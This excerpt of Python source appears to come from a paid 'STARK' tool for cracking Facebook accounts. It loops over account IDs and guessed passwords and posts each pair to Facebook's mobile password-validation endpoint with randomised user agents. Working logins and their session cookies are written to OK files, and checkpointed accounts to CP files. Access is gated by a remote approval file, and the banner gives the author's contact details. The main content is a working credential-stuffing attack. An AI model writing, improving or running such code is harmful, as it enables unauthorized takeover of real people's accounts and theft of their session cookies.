...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/613968710821889/')
#------------------[ STARK-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/Tony-Stark01/Strak-ok/blob/main/Approval').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Tony-Stark01/Strak-ok/blob/main/Approval').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/profile.php?id=100091268645708.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
║\033[0;91m      		██\033[0;92m       ██\033[0;91m██        ██ \033[0;92m██      ██ \033[0;91m██     ██  \033[0;92m    ║
║\033[0;91m ███████\033[0;92m       ██    \033[0;91m███████ \033[0;92m██████  \033[0;91m█████     \033[0;92m    ║
║\033[0;91m ██ \033[0;92m       ██   \033[0;91██        ██ \033[0;92m██    ██ \033[0;91██     ██    \033[0;92m   ║
║\033[0;91m ███████\033[0;92m       ██\033[0;91m██        ██ \033[0;92m██    ██ \033[0;91m██        ██ \033[0;92m ║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR BAYAZID ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Muhammad Bayezid ]   ║  \033[1;97m  
╠══[TIKTOK                   • \33[1;38m ᵀᴱᴬᴹ𝐀 𝐕 𝐄 𝐍 𝐆 𝐄 𝐑 ]   ║\33[1;34m   
╠══[Whatsapp                 • 019413669990]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  Tony,  Stark,  Tools"')
pass
...
def menu():
    ...
    if STARK in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801941366999')
        os.system("python nono.py")
    elif STARK in ['3','03']:
        result()
    elif STARK in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Spider.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[STARK•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[STARK-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[STARK-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " STARK,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[STARK-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•STARK-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•STARK-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  STARK,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
